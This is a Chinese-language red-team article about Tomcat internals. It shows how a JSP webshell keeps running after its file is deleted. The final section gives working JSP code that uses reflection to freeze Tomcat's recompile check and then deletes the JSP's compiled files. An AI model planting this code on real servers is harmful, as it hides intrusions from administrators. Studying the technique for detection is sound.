> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.anquanke.com](https://www.anquanke.com/post/id/224698)

[![](https://p3.ssl.qhimg.com/t012610b091748616ab.jpg)](https://p3.ssl.qhimg.com/t012610b091748616ab.jpg)

背景：

基于现阶段红蓝对抗强度的提升，诸如 WAF 动态防御、态势感知、IDS 恶意流量分析监测、文件多维特征监测、日志监测等手段，能够及时有效地检测、告警甚至阻断针对传统通过文件上传落地的 Webshell 或需以文件形式持续驻留目标服务器的恶意后门。

结合当下的形势，尝试下在 Tomcat 容器中，寻找能为我们渗透测试提供便利的特性。

声明 ：

由于传播或利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，此文仅作交流学习用途。

历史文章：

[Tomcat 容器攻防笔记之 Filter 内存马](https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw)

[Tomcat 容器攻防笔记之 Servlet 内存马](https://mp.weixin.qq.com/s/rEjBeLd8qi0_t_Et37rAng)

一、金蝉脱壳怎么讲？
----------

在 Tomcat 中，JSP 被看作是一种特殊的 servlet，当我们请求 JSP 时，Tomcat 会对 jsp 进行编译，生成相应的 class 文件。在我们渗透测试的过程中通过文件上传令 jsp 落地，动静太大，Webshell 的痕迹太过于明显，容易被管理员发现并删除，而当 JSP 文件被删除后，Webshell 就失效了。当然也可以通过其他组合拳，打入内存马或以其他形式做权限维持。

这次我们根据 Tomcat 对 Jsp 的处理流程来看看，有没有什么办法，当服务器将 JSP 删除后，我们的 webshell 仍能维持运作？

二、Tomcat 基本的 Servlet 有哪些？
-------------------------

通过查看配置文件 / conf/web.xml，可以得知 Tomcat 含有两个默认的 servlet。分别是 DefaultServlet 以及 JspServlet。

[![](https://p4.ssl.qhimg.com/t01c31d057f08603510.png)](https://p4.ssl.qhimg.com/t01c31d057f08603510.png)

对于 Tomcat 而言，当一个请求进入时，若没有匹配到任何在 / WEB-INF/Web.xml 中定义的 Servlet，则最终会流经至这两个默认的 Servlet。

其中，DefaultServlet 主要用于处理静态资源如 HTML、图片、CSS 以及 JS 文件等，为了提高服务器性能，Tomcat 会对访问文件进行缓存，并且按照配置中的 Url-Pattern，客户端请求资源的路径，跟资源的物理路径应当是一致的，当然如果只想加载 static 目录下的资源，这里也可以将 DefaultServlet 的路径匹配限制为 “/static/”，关于 DefaultServlet 不再赘述。

那么，JspServlet 主要负责处理对于 JSP 文件以及 JSPX 文件的请求，如此一来，我们就知道了，处理对于. jsp 和 *.jspx 的请求，调用的是 Servlet 是 JspServlet。

三、JspServlet 的调用过程和逻辑细节
-----------------------

不知道各位还有没有印象，我们 Servlet，在哪个时候、哪个过程、哪个类中才被调用。如果忘记了可以重新翻阅一下《[Tomcat 容器攻防笔记之 Filter 内存马](https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw)》以及《[Tomcat 容器攻防笔记之 Servlet 内存马](https://mp.weixin.qq.com/s/rEjBeLd8qi0_t_Et37rAng)》两篇文章。  
其实，就是在 ApplicationFilterChain 调用 Filter 对请求执行一遍过滤逻辑之后，开始对 Servlet 进行调用。

[![](https://p1.ssl.qhimg.com/t01414e16ed1775a5de.png)](https://p1.ssl.qhimg.com/t01414e16ed1775a5de.png)

具体在 ApplicationFilterChain#internalDoFilter 方法中的 this.servlet.service(request, response)。这里的 this 是 ApplicationFilterChain

[![](https://p3.ssl.qhimg.com/t017e31a2f738a2e0c9.png)](https://p3.ssl.qhimg.com/t017e31a2f738a2e0c9.png)

我们继续来看 JspServlet#service()，前面一段是获取当前请求的 Jsp 路径，比方说请求 “/webapp/index.jsp”, 那么这里就获取的是 jspUri = “/index.jsp”

[![](https://p3.ssl.qhimg.com/t01927c124c947c71a9.png)](https://p3.ssl.qhimg.com/t01927c124c947c71a9.png)

this.preCompile(request) 就是判断一下有没有预编译，我们关注点在 jsp 的刷新机制，这里影响不大，继续往下看。

[![](https://p0.ssl.qhimg.com/t0119006bdbe99e5cca.png)](https://p0.ssl.qhimg.com/t0119006bdbe99e5cca.png)

进入 JspServlet#serviceJspFile() 方法，this.rctxt 指代 JspRuntimeContext 类，它是 Tomcat 后台定期检查 JSP 文件是否变动的类，若有变动则对 JSP 文件重新编译。

[![](https://p0.ssl.qhimg.com/t01b0af54fc4f834ccb.png)](https://p0.ssl.qhimg.com/t01b0af54fc4f834ccb.png)

在 JspRuntimeContext 的成员属性 jsps 中，记录的与 jspUri 对应的 Wrapper，这个 wrapper 逻辑上对应 jsp 经编译后得到的 servlet

[![](https://p3.ssl.qhimg.com/t0192a2ad05f086193e.png)](https://p3.ssl.qhimg.com/t0192a2ad05f086193e.png)

那么第一个 if 逻辑，做的是一个匹配，匹配到了就返回 Wrapper。

往下看，wrapper.service(), 这里进入 JspServletWrapper 的 service 方法。

[![](https://p5.ssl.qhimg.com/t01a08f40e3df863f1f.png)](https://p5.ssl.qhimg.com/t01a08f40e3df863f1f.png)

Tomcat 默认处于开发模式，而生产模式下的 Tomcat，Jsp 更新后需要重启服务才可以生效，这里将进入 this.ctxt.compile()。

此处 this.ctxt 调用的是 JspCompilationContext 类，该类主要是记录用于 JSP 解析引擎的各类数据。当前我们在 JspServletWrapper 类中，调用 compile() 方法是为了确认当前访问的 jsp 是否需要重新编译。

[![](https://p3.ssl.qhimg.com/t01ceea997aa5997fb1.png)](https://p3.ssl.qhimg.com/t01ceea997aa5997fb1.png)

因此当进入 Compile() 中时，关键的逻辑就是 this.jspCompiler.isOutDated()，检查 Jsp 更新。这里顺带讲讲，Tomcat 对于 Jsp 使用的编译器，来看看 this.createCompiler()。

[![](https://p4.ssl.qhimg.com/t016a9af1151fea4bdc.png)](https://p4.ssl.qhimg.com/t016a9af1151fea4bdc.png)

逻辑比较简单，先看看配置文件有没有定义编译器，没有就默认采用 JDTcompiler。

[![](https://p4.ssl.qhimg.com/t014c4fc0762b016e80.png)](https://p4.ssl.qhimg.com/t014c4fc0762b016e80.png)

直接来看 isOutDated() 吧，既然这里是判断我们访问的 JSP 文件有没有更新，在这里搞点事情做点手脚欺骗一下 Tomcat 让它误以为没有更新。

这里是核心步骤，在讲解之前，要先补充点其他的内容。上文中，我们提及到 JspRuntimeContext 类，Jsp 文件经过编译并包装后得到的 JspServletWrapper 实例，其实保存在 JspRuntimeContext#jsps 中。

当我们访问 JSP 文件时，Tomcat 将从 JspRuntimeContext#logs 中，根据我们请求的路径找到相应的 JspServletWrapper，如果没有找到，就进行加载编译，并添加入 jsps 中，无论是新编译好的还是旧编译好的，依旧会调用此时得到的 JspServletWrapper#service() 方法，此时真正响应请求的 servlet 其实已随 JspServletWrapper，保存在 jsps 中。

经过上面分析，最终会去到 isOutDated 方法。如果我们删除了 Jsp 文件，则该方法必然返回 true，Tomcat 将对 jsp 文件进行重新编译，如果没找到 jsp 文件，则报 FileNotFoundException。

那么，真正实现代码逻辑功能的 servlet 已经在 jsps 中安安静静躺好了，要想实现删除掉 Jsp 文件，但仍然让 servlet” 高枕无忧”，就要令 isOutDataed 的第一个 If 逻辑直接返回 false（这个 If 逻辑比较容易处理）

[![](https://p2.ssl.qhimg.com/t01398c638be086c36d.png)](https://p2.ssl.qhimg.com/t01398c638be086c36d.png)

来看，this.jsw 等同于 JspServletWrapper，前两个条件明显成立，ModificationTestInterval 的值默认为 4，jsw 是对我们请求响应的 JspServlet。

后面判断 JspServletWrapper 的 LastModificationTest 加上 4*1000 是否大于系统当前时间，成立则返回 false。

我一看 this.jsw.getLastModificationTest()，啪的一下，很快嗷，有没有朋友已经反应过来了，利用 Java 反射机制动态修改实例中的运行数据，将 LastModificationTest 更改为一个足够大的值，使得这个条件永成立，就可以使得 Tomcat 认为我们的 JSP 文件至始至终不曾更变。

这里是 long 型，可能有的朋友一瞅，阿我直接整个 long 型最大值，使得这个条件永真。留意还有额外的变量要添加，超过最大值会得到一个负数，令这个条件永假。

四、编写代码
------

按照惯例，导入包一览：

```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.jasper.compiler.JspRuntimeContext" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%@ page import="org.apache.jasper.JspCompilationContext" %>
<%@ page import="java.io.File" %>
```

无尽的反射, request 里的 MappingData 东西是真的全, 下列反射的类不知道为什么的要这么做的可以看看上述关于 jsps 的图：

```
<%
    Field requestF = request.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    Request req = (Request) requestF.get(request);

    MappingData mappingData = req.getMappingData();
    Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
    wrapperF.setAccessible(true);
    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);

    Field instanceF = wrapper.getClass().getDeclaredField("instance");
    instanceF.setAccessible(true);
    Servlet jspServlet = (Servlet) instanceF.get(wrapper);

    Field rctxt = jspServlet.getClass().getDeclaredField("rctxt");
    rctxt.setAccessible(true);
    JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);

    Field jspsF = jspRuntimeContext.getClass().getDeclaredField("jsps");
    jspsF.setAccessible(true);
    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);

    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
    jsw.setLastModificationTest(8223372036854775807L);

JspCompilationContext ctxt = jsw.getJspEngineContext();
    File targetFile;
    targetFile = new File(ctxt.getClassFileName());//删掉jsp的.class
    targetFile.delete();
    targetFile = new File(ctxt.getServletJavaFileName());//删掉jsp自身
    targetFile.delete();

%>
```

五、看看效果
------

[![](https://p2.ssl.qhimg.com/t01ba40b8784a71ae53.png)](https://p2.ssl.qhimg.com/t01ba40b8784a71ae53.png)